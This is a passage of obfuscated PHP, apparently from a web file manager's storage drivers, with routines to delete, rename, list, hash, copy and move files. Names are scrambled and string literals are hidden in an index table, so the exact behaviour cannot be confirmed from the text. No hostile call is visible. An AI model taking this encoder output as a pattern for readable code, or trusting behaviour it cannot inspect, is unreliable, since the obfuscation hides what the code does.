delFile($ƒ˜œı×°) { $ƒ˜œı×° = $this->iconvSystem($ƒ˜œı×°); if (!@unlink($ƒ˜œı×°)) { @chmod($ƒ˜œı×°, $this->pathAuth); if (!@unlink($ƒ˜œı×°)) { return !1; } } else { return !0; } } public function delFolder($öİ¹‘ÍÕ) { $¾¨ËµÇ =& $_SERVER[ˆûùúÊ¯]; $öİ¹‘ÍÕ = $this->iconvSystem($öİ¹‘ÍÕ); if (!is_dir($öİ¹‘ÍÕ)) { return !0; } if (!($£¸ƒê† = opendir($öİ¹‘ÍÕ))) { return !1; } while (($öê¨Â¯© = readdir($£¸ƒê†)) !== !1) { if ($öê¨Â¯© == $¾¨ËµÇ[10] || $öê¨Â¯© == $¾¨ËµÇ[1340]) { continue; } $­»¦®˜ = $öİ¹‘ÍÕ . $¾¨ËµÇ[8] . $öê¨Â¯©; if (is_file($­»¦®˜) || is_link($­»¦®˜)) { if (!unlink($­»¦®˜)) { chmod($­»¦®˜, $this->pathAuth); if (!unlink($­»¦®˜)) { return !1; } } } else { if (is_dir($­»¦®˜)) { chmod($­»¦®˜, $this->pathAuth); $­»¦®˜ = $this->iconvApp($­»¦®˜); if (!$this->delFolder($­»¦®˜)) { return !1; } } } } closedir($£¸ƒê†); return rmdir($öİ¹‘ÍÕ); } public function rename($á†ñ…Äâ, $€ºšæ¨) { $éÎ¼æÈ€ =& $_SERVER[ˆûùúÊ¯]; $–Œ¸âò† = $this->fileNameAuto($this->pathFather($á†ñ…Äâ), $€ºšæ¨); $–Œ¸âò† = $this->iconvSystem($–Œ¸âò†); $á†ñ…Äâ = $this->iconvSystem($á†ñ…Äâ); $‡À¾½èÏ = $this->pathFather($á†ñ…Äâ); $½Ë‰í = rtrim($‡À¾½èÏ, $éÎ¼æÈ€[8]) . $éÎ¼æÈ€[8] . $–Œ¸âò†; $½“õ³Ëî = @rename($á†ñ…Äâ, $½Ë‰í); $½Ë‰í = $this->iconvApp($½Ë‰í); return $½“õ³Ëî ? $this->getPathOuter($½Ë‰í) : !1; } public function size($ú©ä¹‘È) { $ú©ä¹‘È = $this->iconvSystem($ú©ä¹‘È); return filesize_64($ú©ä¹‘È); } public function info($Ğ¶½’’Ÿ) { $Ğ¶½’’Ÿ = $this->iconvSystem($Ğ¶½’’Ÿ); if ($this->isFolder($Ğ¶½’’Ÿ)) { return $this->folderInfo($Ğ¶½’’Ÿ); } else { if ($this->isFile($Ğ¶½’’Ÿ)) { return $this->fileInfo($Ğ¶½’’Ÿ); } } return !1; } protected function infoChildren($Ä½Ä¡ÊÉ, &$—ÀÚ•, $°»¢äŒ = true) { $ŞòÜæ­ =& $_SERVER[ˆûùúÊ¯]; check_abort_echo(); $Ä½Ä¡ÊÉ = rtrim($Ä½Ä¡ÊÉ, $ŞòÜæ­[8]) . $ŞòÜæ­[8]; if ($°»¢äŒ) { $Ä½Ä¡ÊÉ = $this->iconvSystem($Ä½Ä¡ÊÉ); } if (!($Ö» ¤šå = @opendir($Ä½Ä¡ÊÉ))) { return; } while (($”ıì‘ê” = readdir($Ö» ¤šå)) !== !1) { if ($”ıì‘ê” == $ŞòÜæ­[10] || $”ıì‘ê” == $ŞòÜæ­[1340]) { continue; } $ÜáÂêõ = $Ä½Ä¡ÊÉ . $”ıì‘ê”; if (is_file($ÜáÂêõ) || is_link($ÜáÂêõ)) { $—ÀÚ•[$ŞòÜæ­[87]]++; $—ÀÚ•[$ŞòÜæ­[86]] += filesize_64($ÜáÂêõ); } else { if (is_dir($ÜáÂêõ)) { $—ÀÚ•[$ŞòÜæ­[88]]++; $this->infoChildren($ÜáÂêõ, $—ÀÚ•, !1); } } } closedir($Ö» ¤šå); } private function folderInfo($ŞˆÃ¡¥Ù, $áÄÖ½Õ· = false) { $Ôˆ„£Ô =& $_SERVER[ˆûùúÊ¯]; $ŞˆÃ¡¥Ù = rtrim($ŞˆÃ¡¥Ù, $Ôˆ„£Ô[8]) . $Ôˆ„£Ô[8]; $Öà¶›Æè = $this->iconvApp($this->pathThis($ŞˆÃ¡¥Ù)); if ($áÄÖ½Õ·) { return array($Ôˆ„£Ô[42] => $Öà¶›Æè, $Ôˆ„£Ô[94] => $this->getPathOuter($ŞˆÃ¡¥Ù), $Ôˆ„£Ô[43] => $Ôˆ„£Ô[85]); } $ØÅ¢ß‘İ = array($Ôˆ„£Ô[42] => $Öà¶›Æè, $Ôˆ„£Ô[94] => $this->getPathOuter($ŞˆÃ¡¥Ù), $Ôˆ„£Ô[43] => $Ôˆ„£Ô[85], $Ôˆ„£Ô[224] => @filectime($ŞˆÃ¡¥Ù), $Ôˆ„£Ô[95] => @filemtime($ŞˆÃ¡¥Ù), $Ôˆ„£Ô[1422] => @fileatime($ŞˆÃ¡¥Ù), $Ôˆ„£Ô[1423] => is_readable($ŞˆÃ¡¥Ù), $Ôˆ„£Ô[1424] => is_writable($ŞˆÃ¡¥Ù), $Ôˆ„£Ô[1425] => get_mode($ŞˆÃ¡¥Ù)); return $ØÅ¢ß‘İ; } private function fileInfo($ª“•Íß, $²–Ñşï = false) { $Ù‘½‹÷ş =& $_SERVER[ˆûùúÊ¯]; $öİùô… = $this->iconvApp($this->pathThis($ª“•Íß)); if ($²–Ñşï) { return array($Ù‘½‹÷ş[42] => $öİùô…, $Ù‘½‹÷ş[94] => $this->getPathOuter($ª“•Íß), $Ù‘½‹÷ş[43] => $Ù‘½‹÷ş[223], $Ù‘½‹÷ş[86] => $this->size($ª“•Íß), $Ù‘½‹÷ş[184] => $this->ext($öİùô…)); } $Ÿ¡şï¯« = array($Ù‘½‹÷ş[42] => $öİùô…, $Ù‘½‹÷ş[94] => $this->getPathOuter($ª“•Íß), $Ù‘½‹÷ş[43] => $Ù‘½‹÷ş[223], $Ù‘½‹÷ş[224] => @filectime($ª“•Íß), $Ù‘½‹÷ş[95] => @filemtime($ª“•Íß), $Ù‘½‹÷ş[1422] => @fileatime($ª“•Íß), $Ù‘½‹÷ş[86] => $this->size($ª“•Íß), $Ù‘½‹÷ş[184] => $this->ext($öİùô…), $Ù‘½‹÷ş[1423] => is_readable($ª“•Íß), $Ù‘½‹÷ş[1424] => is_writable($ª“•Íß), $Ù‘½‹÷ş[1425] => get_mode($ª“•Íß)); return $Ÿ¡şï¯«; } public function exist($¬£²Ñ¨Ä) { $¬£²Ñ¨Ä = $this->iconvSystem($¬£²Ñ¨Ä); return @file_exists($¬£²Ñ¨Ä); } public function isFile($õüøÃ¾) { $õüøÃ¾ = $this->iconvSystem($õüøÃ¾); return @is_file($õüøÃ¾); } public function isFolder($€°óÒ“Â) { $€°óÒ“Â = $this->iconvSystem($€°óÒ“Â); return @is_dir($€°óÒ“Â); } public function listPath($Ñ»úØ‚, $¿â‹á” = false) { $Œ‘¼Ñ÷“ =& $_SERVER[ˆûùúÊ¯]; $Ñ»úØ‚ = $this->iconvSystem($Ñ»úØ‚); $Ñ»úØ‚ = rtrim($Ñ»úØ‚, $Œ‘¼Ñ÷“[8]) . $Œ‘¼Ñ÷“[8]; $ıÕÍÉÀÃ = array($Œ‘¼Ñ÷“[92] => array(), $Œ‘¼Ñ÷“[93] => array()); if (!($íûã¨İ = @opendir($Ñ»úØ‚))) { return $ıÕÍÉÀÃ; } while (($á›Ç¼…œ = readdir($íûã¨İ)) !== !1) { if ($á›Ç¼…œ == $Œ‘¼Ñ÷“[10] || $á›Ç¼…œ == $Œ‘¼Ñ÷“[1340]) { continue; } $¹´¸«Õ = $Ñ»úØ‚ . $á›Ç¼…œ; if (is_file($¹´¸«Õ)) { $ıÕÍÉÀÃ[$Œ‘¼Ñ÷“[93]][] = $this->fileInfo($¹´¸«Õ, $¿â‹á”); } else { $ıÕÍÉÀÃ[$Œ‘¼Ñ÷“[92]][] = $this->folderInfo($¹´¸«Õ, $¿â‹á”); } } closedir($íûã¨İ); return $ıÕÍÉÀÃ; } public function listAll($ç‘¯ß–Ş, &$Ú›“Ñ´€ = array()) { $ıâôÖ„¥ =& $_SERVER[ˆûùúÊ¯]; $ç‘¯ß–Ş = $this->iconvSystem($ç‘¯ß–Ş); $ç‘¯ß–Ş = rtrim($ç‘¯ß–Ş, $ıâôÖ„¥[8]) . $ıâôÖ„¥[8]; if (!($Å‡‹õ¥ = @opendir($ç‘¯ß–Ş))) { return $Ú›“Ñ´€; } while (($ëô·õ’â = readdir($Å‡‹õ¥)) !== !1) { if ($ëô·õ’â == $ıâôÖ„¥[10] || $ëô·õ’â == $ıâôÖ„¥[1340]) { continue; } $ªˆ¤Ï¸ = $ç‘¯ß–Ş . $ëô·õ’â; $õúš·µ = is_dir($ªˆ¤Ï¸) && !is_link($ªˆ¤Ï¸) ? 1 : 0; $ªˆ¤Ï¸ = $õúš·µ ? $ªˆ¤Ï¸ . $ıâôÖ„¥[8] : $ªˆ¤Ï¸; $Ú›“Ñ´€[] = array($ıâôÖ„¥[94] => $ªˆ¤Ï¸, $ıâôÖ„¥[85] => $õúš·µ, $ıâôÖ„¥[95] => intval(@filemtime($ªˆ¤Ï¸)), $ıâôÖ„¥[86] => $õúš·µ ? 0 : intval($this->size($ªˆ¤Ï¸))); if ($õúš·µ) { $this->listAll($ªˆ¤Ï¸, $Ú›“Ñ´€); } } closedir($Å‡‹õ¥); return $Ú›“Ñ´€; } public function has($ëÈóï´ú, $õÈÒá¼÷ = false, $Ú®†Ë± = true) { $÷ÀÄˆĞÓ =& $_SERVER[ˆûùúÊ¯]; $ëÈóï´ú = $this->iconvSystem($ëÈóï´ú); $ëÈóï´ú = rtrim($ëÈóï´ú, $÷ÀÄˆĞÓ[8]) . $÷ÀÄˆĞÓ[8]; if (!($­¥º¥ø½ = @opendir($ëÈóï´ú))) { return !1; } $í™˜Ò©ê = 0; $öÛ‚ê™ = 0; $šß¼°İº = 0; while (($°ú—Ñõ² = readdir($­¥º¥ø½)) !== !1) { if ($°ú—Ñõ² == $÷ÀÄˆĞÓ[10] || $°ú—Ñõ² == $÷ÀÄˆĞÓ[1340]) { continue; } $ûìµéµ = $ëÈóï´ú . $°ú—Ñõ²; if ($õÈÒá¼÷) { $šß¼°İº++; if (@is_file($ûìµéµ)) { $í™˜Ò©ê++; } else { $öÛ‚ê™++; } if ($šß¼°İº > 10000) { break; } continue; } if ($Ú®†Ë±) { if (@is_file($ûìµéµ)) { return !0; } } else { if (@is_dir($ûìµéµ . $÷ÀÄˆĞÓ[8])) { return !0; } } } closedir($­¥º¥ø½); if ($õÈÒá¼÷) { return array($÷ÀÄˆĞÓ[232] => $í™˜Ò©ê, $÷ÀÄˆĞÓ[233] => $öÛ‚ê™); } return !1; } public function hashSimple($£¡¨ıˆ£) { $ÄœÆœå =& $_SERVER[ˆûùúÊ¯]; if (!$£¡¨ıˆ£) { return md5($ÄœÆœå[12]); } $£¡¨ıˆ£ = $this->iconvSystem($£¡¨ıˆ£); $‡é¬ÕÃÒ = $this->size($£¡¨ıˆ£); $Ö÷€Ù¼ç = 200; $å—ìĞÃ‡ = 50; if ($‡é¬ÕÃÒ <= $Ö÷€Ù¼ç * $å—ìĞÃ‡) { return $this->hashMd5($£¡¨ıˆ£) . $‡é¬ÕÃÒ; } $›˜ıéğ´ = $ÄœÆœå[12]; $ıòÅ€É = intval($‡é¬ÕÃÒ / $å—ìĞÃ‡); $ÀÆ–³‚ = fopen($£¡¨ıˆ£, $ÄœÆœå[1426]); if (!$ÀÆ–³‚) { return $›˜ıéğ´; } for ($Ì–º¨îø = 0; $Ì–º¨îø < $å—ìĞÃ‡; $Ì–º¨îø++) { fseek_64($ÀÆ–³‚, $ıòÅ€É * $Ì–º¨îø); $›˜ıéğ´ .= fread($ÀÆ–³‚, $Ö÷€Ù¼ç); } fseek_64($ÀÆ–³‚, $‡é¬ÕÃÒ - $Ö÷€Ù¼ç); $›˜ıéğ´ .= fread($ÀÆ–³‚, $Ö÷€Ù¼ç); fclose($ÀÆ–³‚); return md5($›˜ıéğ´) . $‡é¬ÕÃÒ; } public function getContent($İÇ£…ü¤) { $İÇ£…ü¤ = $this->iconvSystem($İÇ£…ü¤); return file_get_contents($İÇ£…ü¤); } public function setContent($ÖöÛØÓ‚, $»õ¢ò× = '') { $ÖöÛØÓ‚ = $this->iconvSystem($ÖöÛØÓ‚); $åì”“Çå = @file_put_contents($ÖöÛØÓ‚, $»õ¢ò×, LOCK_EX); clearstatcache(); @chmod($ÖöÛØÓ‚, $this->pathAuth); return $åì”“Çå === !1 ? !1 : !0; } public function fileSubstr($ìÈœ¡¿…, $ş„é£ı = 0, $œÊ– €„ = false) { $ÁâÍùßÑ =& $_SERVER[ˆûùúÊ¯]; $ìÈœ¡¿… = $this->iconvSystem($ìÈœ¡¿…); if ($œÊ– €„ === !1) { $œÊ– €„ = $this->size($ìÈœ¡¿…); } if ($œÊ– €„ <= 0) { return $ÁâÍùßÑ[12]; } $™†ÔõË½ = fopen($ìÈœ¡¿…, $ÁâÍùßÑ[1426]); if (!$™†ÔõË½) { return !1; } fseek_64($™†ÔõË½, $ş„é£ı); $§¿Ö“ˆñ = fread($™†ÔõË½, $œÊ– €„); fclose($™†ÔõË½); return $§¿Ö“ˆñ; } public function upload($Ì³üËî¤, $¬­¬ËÃ–, $´£û¾ı« = false, $“´…İ×¿ = REPEAT_REPLACE) { if ($´£û¾ı«) { return $this->moveFile($¬­¬ËÃ–, $Ì³üËî¤); } return $this->copyFile($¬­¬ËÃ–, $Ì³üËî¤); } public function setModifyTime($Ø»œÓ·ı, $àöëÅÊ† = '') { @touch($Ø»œÓ·ı, intval($àöëÅÊ†)); } public function download($ığµ¨ğ…, $¡Ê•ŒÒ) { return $this->iconvSystem($ığµ¨ğ…); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($îÕí¶á) { parent::__construct($îÕí¶á); $this->signatureVersion($_SERVER[ˆûùúÊ¯][240]); } public function fileOutLink($Ğ¢½Ä§Ÿ) { $ğèæ©¬ =& $_SERVER[ˆûùúÊ¯]; if (substr($Ğ¢½Ä§Ÿ, 0, 7) == $ğèæ©¬[1391]) { $Ğ¢½Ä§Ÿ = $ğèæ©¬[1392] . substr($Ğ¢½Ä§Ÿ, 7); } header($ğèæ©¬[171] . $Ğ¢½Ä§Ÿ); die; } } goto CÕòˆ÷«ïÎ; Eôªïñó‹¤: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ßë­ÎÓÜ, $ø‚·»²Ï) { $º©ß÷Ãê =& $_SERVER[ˆûùúÊ¯]; $‹ÒÒ¢ŸÌ = $ø‚·»²Ï; $GLOBALS[$º©ß÷Ãê[1207]] = $º©ß÷Ãê[1208] . $ßë­ÎÓÜ; Hook::trigger($º©ß÷Ãê[1208] . $ßë­ÎÓÜ . $º©ß÷Ãê[1209], $‹ÒÒ¢ŸÌ); $µÍ¡×Šë = self::driverMake($ø‚·»²Ï[0]); if (!$µÍ¡×Šë) { return !1; } if (method_exists($µÍ¡×Šë, $ßë­ÎÓÜ)) { $ÄÖºŠ»Ç = @call_user_func_array(array($µÍ¡×Šë, $ßë­ÎÓÜ), $ø‚·»²Ï); } else { if (method_exists($µÍ¡×Šë, $º©ß÷Ãê[1210])) { $ÄÖºŠ»Ç = @call_user_func_array(array($µÍ¡×Šë, $ßë­ÎÓÜ), $ø‚·»²Ï); } else { if (method_exists(self, $ßë­ÎÓÜ)) { $ÄÖºŠ»Ç = @call_user_func_array(array(self, $ßë­ÎÓÜ), $ø‚·»²Ï); } else { $ÄÖºŠ»Ç = call_user_func_array(array(parent, $ßë­ÎÓÜ), $ø‚·»²Ï); } } } Hook::trigger($º©ß÷Ãê[1208] . $ßë­ÎÓÜ . $º©ß÷Ãê[1211], $‹ÒÒ¢ŸÌ, $ÄÖºŠ»Ç); return $ÄÖºŠ»Ç; } public static function init($·²¼›–†) { return self::driverMake($·²¼›–†); } public static function copy($áÄÁüïò, $Î‘¥•«œ, $âàÍ¿” = false, $×’ªÇŒ³ = false) { return self::copyMoveStart($áÄÁüïò, $Î‘¥•«œ, $âàÍ¿”, $_SERVER[ˆûùúÊ¯][594], $×’ªÇŒ³); } public static function move($­ê¯ñƒÔ, $Î°îÓİÏ, $¸ÛÏ×ìé = false, $¯™òêµ© = false) { return self::copyMoveStart($­ê¯ñƒÔ, $Î°îÓİÏ, $¸ÛÏ×ìé, $_SERVER[ˆûùúÊ¯][596], $¯™òêµ©); } private static function copyMoveStart($€‚İ¯Úğ, $ğÉŞï¤Ñ, $Ç²ƒõ¨À, $ˆ¥·ëÕÀ, $Õé÷Éû) { $”‰ãŒ•µ =& $_SERVER[ˆûùúÊ¯]; $ìµ˜•š = array($€‚İ¯Úğ, $ğÉŞï¤Ñ, $Ç²ƒõ¨À, $Õé÷Éû); Hook::trigger($”‰ãŒ•µ[1208] . $ˆ¥·ëÕÀ . $”‰ãŒ•µ[1209], $ìµ˜•š); $¤±…°ğ = self::copyMove($€‚İ¯Úğ, $ğÉŞï¤Ñ, $Ç²ƒõ¨À, $ˆ¥·ëÕÀ, $Õé÷Éû); Hook::trigger($”‰ãŒ•µ[1208] . $ˆ¥·ëÕÀ . $”‰ãŒ•µ[1211], $ìµ˜•š, $¤±…°ğ); return $¤±…°ğ; } public static function saveFile($¨Çæ•˜Œ, $«ŞÌ…”, $Œû˜Íò® = true) { $Æ¶Éï¢¯ =& $_SERVER[ˆûùúÊ¯]; $¶÷«¨Ú£ = self::info($«ŞÌ…”); $ÙÏÖ™Ûê = self::driverMake($¨Çæ•˜Œ); $¨ÕşÂ˜É = self::driverMake($«ŞÌ…”); $´¤”í¤Ñ = !1; if ($¨ÕşÂ˜É->pathParse[$Æ¶Éï¢¯[1212]]) { $´¤”í¤Ñ = $¨ÕşÂ˜É; $«ıƒ£ÁÁ = $¨ÕşÂ˜É->pathParse[$Æ¶Éï¢¯[1212]]; $¨ÕşÂ˜É = self::driverMake($«ıƒ£ÁÁ); } if ($ÙÏÖ™Ûê->pathParse[$Æ¶Éï¢¯[1212]]) { $£Î¸ÏÉû = $ÙÏÖ™Ûê->pathParse[$Æ¶Éï¢¯[1212]]; $ÙÏÖ™Ûê = self::driverMake($£Î¸ÏÉû); } $Æ ¡ëáŸ = $¨ÕşÂ˜É->pathFather($«ŞÌ…”); $â¤õù = !0; if (!$Œû˜Íò® && self::driverIsSame($ÙÏÖ™Ûê, $¨ÕşÂ˜É)) { $â¤õù = !1; } $æŠÆáá÷ = self::copyFile($ÙÏÖ™Ûê, $¨Çæ•˜Œ, $¨ÕşÂ˜É, $Æ ¡ëáŸ, $¶÷«¨Ú£[$Æ¶Éï¢¯[42]], $â¤õù); if ($´¤”í¤Ñ) { $æŠÆáá÷ = $´¤”í¤Ñ->getPathOuter($æŠÆáá÷); } return $æŠÆáá÷; } private static function copyMove($ºıã•â, $ó¤ ış¨, $õÇ§†«, $²ƒ±Èàï, $“Ã“‹£š = false) { $¨ıÔ¿«â =& $_SERVER[ˆûùúÊ¯]; if (!$ºıã•â || $ºıã•â == $¨ıÔ¿«â[8] || !$ó¤ ış¨) { return !1; } ignore_timeout(); $ ±‡˜œ… = self::driverMake($ºıã•â); $Şç‹ş­· = self::driverMake($ó¤ ış¨); $–íÙŞÏ = $²ƒ±Èàï == $¨ıÔ¿«â[596]; $Í…Ší¤á = !1; if ($Şç‹ş­·->pathParse[$¨ıÔ¿«â[1212]]) { $Í…Ší¤á = $Şç‹ş­·; $ó¤ ış¨ = $Şç‹ş­·->pathParse[$¨ıÔ¿«â[1212]]; $Şç‹ş­· = self::driverMake($ó¤ ış¨); } if ($ ±‡˜œ…->pathParse[$¨ıÔ¿«â[1212]]) { $ºıã•â = $ ±‡˜œ…->pathParse[$¨ıÔ¿«â[1212]]; $ ±‡˜œ… = self::driverMake($ºıã•â); } self::check($ ±‡˜œ…, $ºıã•â, $Şç‹ş­·, $ó¤ ış¨); Hook::trigger($¨ıÔ¿«â[1213], $ ±‡˜œ…, $ºıã•â, $Şç‹ş­·, $ó¤ ış¨); $°…“‘ = self::driverIsSame($ ±‡˜œ…, $Şç‹ş­·); if ($°…“‘) { if ($²ƒ±Èàï == $¨ıÔ¿«â[596] && !method_exists($Şç‹ş­·, $¨ıÔ¿«â[1214]) && trim($ó¤ ış¨, $¨ıÔ¿«â[8]) == trim($Şç‹ş­·->pathFather($ºıã•â), $¨ıÔ¿«â[8])) { if ($ ±‡˜œ…->pathThis($ºıã•â) != $“Ã“‹£š && !$ ±‡˜œ…->isTypeObject()) { return $ ±‡˜œ…->rename($ºıã•â, $“Ã“‹£š); } return $Şç‹ş­·->getPathOuter($ºıã•â); } if (method_exists($Şç‹ş­·, $²ƒ±Èàï)) { return $Şç‹ş­·->{$²ƒ±Èàï}($ºıã•â, $ó¤ ış¨, $õÇ§†«, $“Ã“‹£š); } } if ($°…“‘ && $²ƒ±Èàï == $¨ıÔ¿«â[596] && $Şç‹ş­·->getType() == $¨ıÔ¿«â[116]) { $ö¹ó®åâ = $Şç‹ş­·->movePath($ºıã•â, $ó¤ ış¨, $“Ã“‹£š); if ($ö¹ó®åâ) { return $ö¹ó®åâ; } } $´ğîƒ¼¿ = $ ±‡˜œ…->isFile($ºıã•â); if (!$´ğîƒ¼¿ && $Şç‹ş­·->getType() == $¨ıÔ¿«â[817] && $ ±‡˜œ…->getType() == $¨ıÔ¿«â[116]) { $ö¹ó®åâ = $Şç‹ş­·->copyFolderFromIO($ ±‡˜œ…, $ºıã•â, $ó¤ ış¨, $õÇ§†«, $–íÙŞÏ, $“Ã“‹£š); } else { $ö¹ó®åâ = self::copyPath($ ±‡˜œ…, $ºıã•â, $Şç‹ş­·, $ó¤ ış¨, $õÇ§†«, $–íÙŞÏ, $´ğîƒ¼¿, $“Ã“‹£š); } if ($ö¹ó®åâ && $–íÙŞÏ) { $ ±‡˜œ…->remove($ºıã•â); } if ($Í…Ší¤á) { $ö¹ó®åâ = $Í…Ší¤á->getPathOuter($ö¹ó®åâ); } return $ö¹ó®åâ; } private static function check($ŞäüÂÎğ, $×ùã¸ìì, $‹¾Ğ©, &$ÏÈ—¡ÖÕ) { $ûÄİ›Å™ =& $_SERVER[ˆûùúÊ¯]; if (self::driverIsSame($ŞäüÂÎğ, $‹¾Ğ©) && $ŞäüÂÎğ->isFolder($×ùã¸ìì) && $ŞäüÂÎğ->isParentOf($×ùã¸ìì, $ÏÈ—¡ÖÕ)) { show_json(LNG($ûÄİ›Å™[1215]), !1); } if (!$ŞäüÂÎğ->exist($×ùã¸ìì)) { show_json(LNG($ûÄİ›Å™[115]), !1); } } private static function copyPath($“é·í×Ÿ, $Õ‚¥ÆéÄ, $ş¨¿¾àÄ, $«µ–ıóµ, $š£ÓšßÑ, $Ä©İİµ, $ß…¦ãš, $†êÏÏªå = false, $Èê™§µŒ = true) { $Å¸ÃÍ¸Ã =& $_SERVER[ˆûùúÊ¯]; $•”ÉĞ‡ = empty($†êÏÏªå) && $†êÏÏªå !== $Å¸ÃÍ¸Ã[221] ? $“é·í×Ÿ->pathThis($Õ‚¥ÆéÄ) : $†êÏÏªå; if ($š£ÓšßÑ) { $®‡¦›àÛ = $ş¨¿¾àÄ->fileNameExist($«µ–ıóµ, $•”ÉĞ‡); $¤ ñÀƒ = $•”ÉĞ‡; $•”ÉĞ‡ = $ş¨¿¾àÄ->fileNameAuto($«µ–ıóµ, $•”ÉĞ‡, $š£ÓšßÑ, !$ß…¦ãš); if (!$®‡¦›àÛ || $¤ ñÀƒ != $•”ÉĞ‡) { $š£ÓšßÑ = !1; } if ($Èê™§µŒ && !$š£ÓšßÑ) { $ş¨¿¾àÄ->_data[$Å¸ÃÍ¸Ã[1216]] = !0; } } if ($ß…¦ãš) { return self::copyFile($“é·í×Ÿ, $Õ‚¥ÆéÄ, $ş¨¿¾àÄ, $«µ–ıóµ, $•”ÉĞ‡, $Ä©İİµ); } if ($š£ÓšßÑ == REPEAT_RENAME_FOLDER) { $š£ÓšßÑ = !1; } $³¥†‘¿û = rtrim($«µ–ıóµ, $Å¸ÃÍ¸Ã[8]) . $Å¸ÃÍ¸Ã[8] . $•”ÉĞ‡; $¶–¯Ÿ‹ª = $ş¨¿¾àÄ->mkdir($ş¨¿¾àÄ->getPath($³¥†‘¿û), $š£ÓšßÑ); $«µ–ıóµ = $ş¨¿¾àÄ->getPathInner($¶–¯Ÿ‹ª); $¸ô“ÉÒÒ = $“é·í×Ÿ->listPath($Õ‚¥ÆéÄ, !0); $¸ô“ÉÒÒ = is_array($¸ô“ÉÒÒ) ? $¸ô“ÉÒÒ : array($Å¸ÃÍ¸Ã[93] => array(), $Å¸ÃÍ¸Ã[92] => array()); $Öì³²åŞ = array_merge($¸ô“ÉÒÒ[$Å¸ÃÍ¸Ã[93]], $¸ô“ÉÒÒ[$Å¸ÃÍ¸Ã[92]]); foreach ($Öì³²åŞ as $ÜŒ¢À³Æ) { $»ô²Ú¼™ = $ÜŒ¢À³Æ[$Å¸ÃÍ¸Ã[43]] == $Å¸ÃÍ¸Ã[223]; $Õ‚¥ÆéÄ = $“é·í×Ÿ->getPathInner($ÜŒ¢À³Æ[$Å¸ÃÍ¸Ã[94]]); $ûÀ¦Û® = self::copyPath($“é·í×Ÿ, $Õ‚¥ÆéÄ, $ş¨¿¾àÄ, $«µ–ıóµ, $š£ÓšßÑ, $Ä©İİµ, $»ô²Ú¼™, !1, !1); if (!$ûÀ¦Û®) { IO::errorTips($Å¸ÃÍ¸Ã[1217] . $Õ‚¥ÆéÄ . $Å¸ÃÍ¸Ã[80] . $«µ–ıóµ); } } self::copyMoveKeepInfo($“é·í×Ÿ, $Õ‚¥ÆéÄ, $¶–¯Ÿ‹ª); return $¶–¯Ÿ‹ª; } private static function copyFile($äÏ¼±Ç, $¹™çˆĞ, $Æıˆ›¨, $›òÕ¤—, $ñÙ¹ÎŒ, $Üäùë‘) { $Ìã¢ıÂ¾ =& $_SERVER[ˆûùúÊ¯]; $›òÕ¤— = $Æıˆ›¨->getPath(rtrim($›òÕ¤—, $Ìã¢ıÂ¾[8]) . $Ìã¢ıÂ¾[8] . $ñÙ¹ÎŒ); $Ùóó†°¬ = $Ìã¢ıÂ¾[1218] . time() . rand_string(5); Hook::trigger($Ìã¢ıÂ¾[1219], $äÏ¼±Ç, $¹™çˆĞ, $Æıˆ›¨, $›òÕ¤—, $ñÙ¹ÎŒ, $Ùóó†°¬); if (self::driverIsSame($äÏ¼±Ç, $Æıˆ›¨)) { if ($Üäùë‘) { $À¸ôõÌ = $Æıˆ›¨->moveFile($¹™çˆĞ, $›òÕ¤—); } else { $À¸ôõÌ = $Æıˆ›¨->copyFile($¹™çˆĞ, $›òÕ¤—); } Hook::trigger($Ìã¢ıÂ¾[1220], $äÏ¼±Ç, $¹™çˆĞ, $Æıˆ›¨, $›òÕ¤—, $ñÙ¹ÎŒ, $À¸ôõÌ); self::copyMoveKeepInfo($äÏ¼±Ç, $¹™çˆĞ, $À¸ôõÌ); return $À¸ôõÌ; } $ç¶ÁÆë = TEMP_FILES; if ($GLOBALS[$Ìã¢ıÂ¾[6]][$Ìã¢ıÂ¾[99]][$Ìã¢ıÂ¾[856]]) { $ç¶ÁÆë = $GLOBALS[$Ìã¢ıÂ¾[6]][$Ìã¢ıÂ¾[99]][$Ìã¢ıÂ¾[856]]; } $¥ŠÀÌĞÒ = $ç¶ÁÆë; mk_dir($¥ŠÀÌĞÒ); $ºıÔƒÖ = $¥ŠÀÌĞÒ . $Ùóó†°¬; $Çï¸ğ‡ = $ºıÔƒÖ; $ºıÔƒÖ = $äÏ¼±Ç->download($¹™çˆĞ, $ºıÔƒÖ); $ºıÔƒÖ = $äÏ¼±Ç->iconvApp($ºıÔƒÖ); if (substr($ºıÔƒÖ, strlen($ç¶ÁÆë)) == $ç¶ÁÆë) { $Üäùë‘ = !0; } $À¸ôõÌ = $Æıˆ›¨->upload($›òÕ¤—, $ºıÔƒÖ, $Üäùë‘); self::remove($Çï¸ğ‡); Hook::trigger($Ìã¢ıÂ¾[1220], $äÏ¼±Ç, $¹™çˆĞ, $Æıˆ›¨, $›òÕ¤—, $ñÙ¹ÎŒ, $À¸ôõÌ); self::copyMoveKeepInfo($äÏ¼±Ç, $¹™çˆĞ, $À¸ôõÌ); return $À¸ôõÌ; } private static function copyMoveKeepInfo($‰µ¬†ª, $ŸÕ‘ºª, $‰ÕÓã±Ö) { if (!$‰ÕÓã±Ö) { return; } $‹”ÕŒö = $‰µ¬†ª->info($ŸÕ‘ºª); if (!is_array($‹”ÕŒö)) { return; } IO::setModifyTime($‰ÕÓã±Ö, $‹”ÕŒö[$_SERVER[ˆûùúÊ¯][95]]); } public static function pathFather($Ñà¬ëšë) { $İÓµ¯˜¬ = IO::init($Ñà¬ëšë); $ŞáßÏÇ¿ = $İÓµ¯˜¬->pathFather($İÓµ¯˜¬->path); return $İÓµ¯˜¬->getPathOuter($ŞáßÏÇ¿); } public static function fileOut($¾ò¶¶î, $ºŒé‘Æ = false, $µı™½›– = false, $ÆÒ¤üúÖ = '') { $ˆÖ”ìÁ÷ = self::driverMake($¾ò¶¶î); if ($ˆÖ”ìÁ÷->isFileOutServer()) { return $ˆÖ”ìÁ÷->fileOutServer($¾ò¶¶î, $ºŒé‘Æ, $µı™½›–, $ÆÒ¤üúÖ); } return $ˆÖ”ìÁ÷->fileOut($¾ò¶¶î, $ºŒé‘Æ, $µı™½›–, $ÆÒ¤üúÖ); } public static function fileOutImage($ÄÁ©©¥, $ûºÙ²Úñ = 250) { $îŸ‹´„ = array(250, 600, 1200, 2000, 3000, 5000); for ($¨¸ÆÖ¹ = 0; $¨¸ÆÖ¹ < count($îŸ‹´„); $¨¸ÆÖ¹++) { if ($¨¸ÆÖ¹ == 0 && $ûºÙ²Úñ <= $îŸ‹´„[$¨¸ÆÖ¹]) 